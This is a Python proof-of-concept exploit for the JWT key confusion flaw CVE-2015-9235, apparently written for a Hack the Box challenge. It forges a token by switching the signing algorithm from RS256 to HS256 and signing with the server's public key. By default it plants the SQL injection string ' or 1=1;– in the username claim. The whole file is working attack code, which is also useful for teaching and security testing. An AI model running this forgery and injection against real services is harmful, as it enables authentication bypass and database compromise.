#JWT Key Confusion (CVE 2015-9235)
#https://github.com/aalex954

import base64
import argparse
import json
import hashlib
import hmac
from colorama import Fore

#Take user input
parser = argparse.ArgumentParser(description="JWT Confusion CVE-2015-9235 PoC for the Hack the Box challenge - Under Construction")
parser.add_argument("token_location", type=str, help="location of JWT token (must include 'pk' payload)", default="./token",nargs="?")
parser.add_argument("claim_key", type=str, help="payload claim to target", default="username",nargs="?")
parser.add_argument("claim_value", type=str, help="new claim value", default='''‘ or 1=1;–''',nargs="?")
args = parser.parse_args()

#Debugging only
# args = parser.parse_args(["./token","username","burp"])

#Load token
print(Fore.YELLOW + "TOKEN DIR:" + args.token_location + Fore.RESET)
token_file = open(args.token_location, "r")
token = token_file.read()
token_file.close()
print()

#Split token into parts (header, payload, signature)
token_parts = []

for parts in token.split("."):
    token_parts.append(parts)

encoded_header = token_parts[0]
encoded_payload = token_parts[1]
encoded_signature = token_parts[2] #dont need this

#Decode jwt token parts
decoded_header = base64.urlsafe_b64decode(encoded_header).decode('UTF-8')
decoded_payload = base64.urlsafe_b64decode(encoded_payload).decode('UTF-8')
decoded_payload_json = json.loads(decoded_payload)

#Pull public key from returned jwt payload
public_key = decoded_payload_json.get('pk')

#Removes extra claims from payload for troubleshooting
#decoded_payload_json.pop('pk')
#decoded_payload_json.pop('iat')

#Print Original Decoded JWT
print(Fore.YELLOW + "ORIGINAL TOKEN:" + Fore.RESET)
print(token)
print(Fore.YELLOW + "HEADER: "  + Fore.RESET)
print(decoded_header)
print(Fore.YELLOW + "PAYLOAD: "  + Fore.RESET)
print(json.dumps(decoded_payload_json))
print(Fore.YELLOW + "PUBLIC KEY: "  + Fore.RESET)
print(public_key)

print(Fore.GREEN + "-------------------------------------------NEW TOKEN-------------------------------------------\n" + Fore.RESET)

#Create new header (change from RS256 -> HS256)
header = '{"alg":"HS256","typ":"JWT"}'
headerEncodedBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
encodedHeader = str(headerEncodedBytes, "utf-8").rstrip("=")

#Print new header
print(Fore.YELLOW + "NEW HEADER: " + Fore.RESET)
print(header + "\n")
print(Fore.GREEN + "ENCODED: " + Fore.RESET)
print(headerEncodedBytes)
print()

#Create new payload with claim replaced by user input (key and value)
decoded_payload_json[args.claim_key] = args.claim_value

payload = json.dumps(decoded_payload_json)
payloadEncodedBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodedPayload = str(payloadEncodedBytes, "utf-8").rstrip("=")

#Print new payload data
print(Fore.YELLOW + "NEW PAYLOAD: " + Fore.RESET)
print(payload + "\n")
print(Fore.GREEN + "ENCODED PAYLOAD: " + Fore.RESET)
print(payloadEncodedBytes)
print()

#Build new token
newToken = (encodedHeader + "." + encodedPayload)

#Create new signature
sig = base64.urlsafe_b64encode(
    hmac.new(bytes(public_key, "UTF-8"),newToken.encode('utf-8'),
    hashlib.sha256).digest()
    ).decode('UTF-8').rstrip("=")

print(Fore.GREEN + "ENCODED SINGATURE: " + Fore.RESET)
print(sig + "\n")

#Sign new token
newToken = newToken + "." + sig

#Print new token
print(Fore.YELLOW + "NEW TOKEN: " + Fore.RESET)
print(newToken)
